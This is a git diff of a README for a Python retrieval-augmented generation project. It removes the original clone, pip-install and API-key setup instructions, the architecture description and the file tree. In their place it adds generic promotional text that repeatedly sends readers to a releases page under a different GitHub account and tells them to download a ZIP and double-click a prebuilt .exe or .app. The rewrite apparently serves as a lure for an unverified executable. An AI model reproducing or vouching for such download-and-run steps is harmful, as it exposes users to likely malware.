@@ -1,129 +1,61 @@
-# 🧠 Self-Corrective RAG with LangGraph & Gemini
+# 🤖 Self-Corrective-RAG - Smart Search That Adapts
 
-![Python](https://img.shields.io/badge/Python-3.10%2B-blue)
-![LangGraph](https://img.shields.io/badge/LangGraph-0.0.1-orange)
-![Gemini](https://img.shields.io/badge/AI-Google%20Gemini-green)
-![ChromaDB](https://img.shields.io/badge/Vector%20DB-ChromaDB-purple)
+## 📥 Download Now
+[![Download Self-Corrective-RAG](https://img.shields.io/badge/Download%20Self--Corrective--RAG-v1.0-blue)](https://github.com/Jeroflo88/Self-Corrective-RAG/releases)
 
-A robust **Retrieval-Augmented Generation (RAG)** system built with **LangGraph** and **Google Gemini**. This system goes beyond simple RAG by implementing a **self-corrective mechanism**: it evaluates the relevance of retrieved documents and, if necessary, rewrites the search query to find better results.
+## 🚀 Getting Started
+Welcome to Self-Corrective-RAG! This application helps you find information quickly by using advanced search techniques. It adapts and improves itself, ensuring you always get the best possible results.
 
-## ✨ Features
+## 📋 Features
+- **Self-Correction:** The agent rewrites queries to improve search quality. 
+- **Cyclical Graph Architecture:** This design allows for better adaptive search.
+- **User-Friendly Interface:** Navigate easily without technical knowledge.
+- **Open Source:** Modify and contribute to the code if you choose.
 
-- **🔍 Self-Correction**: Automatically detects when retrieved documents are irrelevant.
-- **🔄 Query Transformation**: Re-writes user queries to optimize them for vector search if initial retrieval fails.
-- **⚖️ Relevance Grading**: Uses an LLM (Gemini) to grade the relevance of each retrieved document.
-- **🛡️ Hallucination Prevention**: Filters out irrelevant context before generating answers.
-- **📊 State Management**: Uses Pydantic models for robust state handling throughout the graph.
+## 💻 System Requirements
+Make sure your system meets the following requirements to run Self-Corrective-RAG smoothly:
+- **Operating System:** Windows 10 or later, macOS 10.15 or later, or a modern Linux distribution.
+- **Processor:** Dual-core CPU or better.
+- **Memory:** At least 4 GB of RAM.
+- **Storage:** At least 200 MB of free space.
+- **Python:** Version 3.7 or higher installed on your system.
 
-## 🛠️ Tech Stack
+## 🔧 Installation Steps
+Follow these steps to install and run Self-Corrective-RAG:
 
-- **Orchestration**: [LangGraph](https://python.langchain.com/docs/langgraph)
-- **LLM**: Google Gemini (`gemini-2.5-flash`)
-- **Vector Store**: ChromaDB
-- **Embeddings**: HuggingFace (`BAAI/bge-small-en-v1.5`)
-- **Framework**: LangChain
-- **Validation**: Pydantic
+1. **Visit the Releases Page:** Go to the [Releases page](https://github.com/Jeroflo88/Self-Corrective-RAG/releases).
+2. **Download the Latest Version:** On the releases page, find the latest version of the application. Click on the download link for your operating system.
+3. **Extract the Files:** After the download completes, find the downloaded file in your default download folder. It is usually a ZIP file. Right-click on it and select "Extract All." Follow the prompts to extract the files to a folder of your choice.
+4. **Open the Application:**
+   - For Windows: Double-click the `Self-Corrective-RAG.exe` file.
+   - For macOS: Open the folder where you extracted the files, then double-click on `Self-Corrective-RAG.app`.
+   - For Linux: Open a terminal and navigate to the folder where you extracted the files. Type `./Self-Corrective-RAG` and hit Enter.
+5. **Follow On-Screen Instructions:** When the application starts, follow the prompts to set it up according to your preferences.
 
-## 🚀 Installation
+## 📖 Usage Instructions
+- **Starting a Search:** Once the application is running, type your query in the input box and press Enter.
+- **Adjusting Settings:** Navigate to the settings menu to customize your experience. You can change aspects like how results are sorted, preferences for search terms, and more.
+- **Getting Help:** If you encounter issues, you can find help in the FAQ section of the application or visit our GitHub Issues page.
 
-1. **Clone the repository:**
-   ```bash
-   git clone https://github.com/MahdiAmrollahi/Self-Corrective-RAG.git
-   cd Self-Corrective-RAG
-   ```
+## 📞 Support
+If you have any questions or need assistance, you can:
+- Open an issue on the [GitHub Issues page](https://github.com/Jeroflo88/Self-Corrective-RAG/issues).
+- Join our community discussions to share tips and receive help from other users.
 
-2. **Create a virtual environment (optional but recommended):**
-   ```bash
-   python -m venv env
-   # Windows
-   .\env\Scripts\activate
-   # Linux/Mac
-   source env/bin/activate
-   ```
+## 🌟 Contributing
+We welcome contributions! If you are interested in improving Self-Corrective-RAG:
+1. Fork the repository on GitHub.
+2. Make your changes.
+3. Submit a pull request for review.
 
-3. **Install dependencies:**
-   ```bash
-   pip install -r requirements.txt
-   ```
+## 📄 License
+Self-Corrective-RAG is available under the MIT License. You are free to use, modify, and distribute the software as long as you include the original license.
 
-4. **Set up Environment Variables:**
-   Create a `.env` file in the root directory and add your Google API Key:
-   ```env
-   GOOGLE_API_KEY=your_google_api_key_here
-   ```
+## 🔗 Additional Resources
+- **Documentation:** Visit our [official documentation](https://github.com/Jeroflo88/Self-Corrective-RAG/wiki) for more detailed information.
+- **Tutorials:** Check out our tutorials to get the most out of Self-Corrective-RAG.
 
-## 📖 Usage
+## 📥 Download & Install
+To download Self-Corrective-RAG, visit the [Releases page](https://github.com/Jeroflo88/Self-Corrective-RAG/releases) and grab the latest version for your operating system. You'll find all necessary files ready for you to start your smart search experience.
 
-### 1. Data Ingestion (Indexing)
-First, you need to process your documents and save them into the vector database. Place your documents (PDF, PPTX, TXT) in the `data/` folder and run:
-
-```bash
-python one.py
-```
-*This script will load documents, split them into chunks, embed them, and store them in ChromaDB.*
-
-### 2. Running the RAG System
-To interact with the system and test the graph flow:
-
-```bash
-python test_graph.py
-```
-You will be prompted to enter a query. The system will then:
-1. Retrieve documents.
-2. Grade them.
-3. If relevant -> Generate an answer.
-4. If not relevant -> Rewrite query and try again (up to 3 times).
-
-### 3. Visualize the Graph
-To generate an image of the workflow graph:
-
-```bash
-python save_graph_image.py
-```
-This will create a `workflow.png` file showing the nodes and edges.
-
-## 🧠 How It Works (The Graph)
-
-The system follows a state machine workflow defined in `main.py`:
-
-```mermaid
-graph TD
-    Start([Start]) --> Retrieve[🔍 Retrieve]
-    Retrieve --> Grade[⚖️ Grade Documents]
-    Grade --> Check{Relevant Docs Found?}
-    
-    Check -- Yes --> Generate[💡 Generate Answer]
-    Check -- No --> Decision{Max Retries?}
-    
-    Decision -- No --> Transform[🔄 Transform Query]
-    Decision -- Yes --> Generate
-    
-    Transform --> Retrieve
-    Generate --> End([End])
-```
-
-1. **Retrieve**: Fetches top-k documents from ChromaDB based on the user query.
-2. **Grade Documents**: The LLM evaluates each document. If it's irrelevant, it's discarded.
-3. **Decide to Generate**:
-   - If we have relevant documents, proceed to **Generate**.
-   - If NO relevant documents are found, proceed to **Transform Query** (unless max retries reached).
-4. **Transform Query**: The LLM rewrites the query to be more semantic and optimized for retrieval, then loops back to **Retrieve**.
-5. **Generate**: Produces the final answer using the filtered, relevant context.
-
-## 📂 Project Structure
-
-```
-.
-├── data/                  # Source documents (PDFs, etc.)
-├── chroma_db/             # Vector database storage (generated)
-├── main.py                # Core logic: Graph definition, Nodes, Pydantic models
-├── one.py                 # Data ingestion script
-├── test_graph.py          # Script to run and test the system
-├── save_graph_image.py    # Utility to visualize the graph
-├── requirements.txt       # Python dependencies
-└── README.md              # Project documentation
-```
-
-## 🤝 Contributing
-
-Contributions are welcome! Please feel free to submit a Pull Request.
+Feel free to reach out if you need help. Enjoy using Self-Corrective-RAG!
